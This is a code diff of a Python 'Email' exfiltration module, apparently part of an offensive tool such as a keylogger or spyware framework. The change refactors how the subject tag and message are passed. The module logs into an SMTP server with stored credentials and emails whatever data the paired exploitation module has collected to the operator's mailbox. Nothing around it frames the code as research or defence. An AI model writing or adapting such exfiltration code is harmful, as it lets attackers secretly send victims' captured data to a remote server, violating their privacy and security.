@@ -12,18 +12,17 @@ from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule
 class Email(ExfiltrationModule):
     def __init__(self, *,
                  module: ExploitationModule,
-                 tag: str = None,
                  smtp_host: str,
                  smtp_port: int,
                  email: str,
                  password: str):
-        super().__init__(module, tag)
+        super().__init__(module)
         self.smtp_host = smtp_host
         self.smtp_port = smtp_port
         self.email = email
         self.password = password
 
-    def update(self):
+    def update(self, message: str) -> None:
         """Send each report as an email through a secure connection
         using SMTP."""
         if self.module.has_data is True:
@@ -35,4 +34,4 @@ class Email(ExfiltrationModule):
                 server.login(user=self.email, password=self.password)
                 server.sendmail(from_addr=self.email,
                                 to_addrs=self.email,
-                                msg=f"Subject:{self.tag}\n\n{self.report}")
+                                msg=f"Subject:{self.module.tag}\n\n{message}")
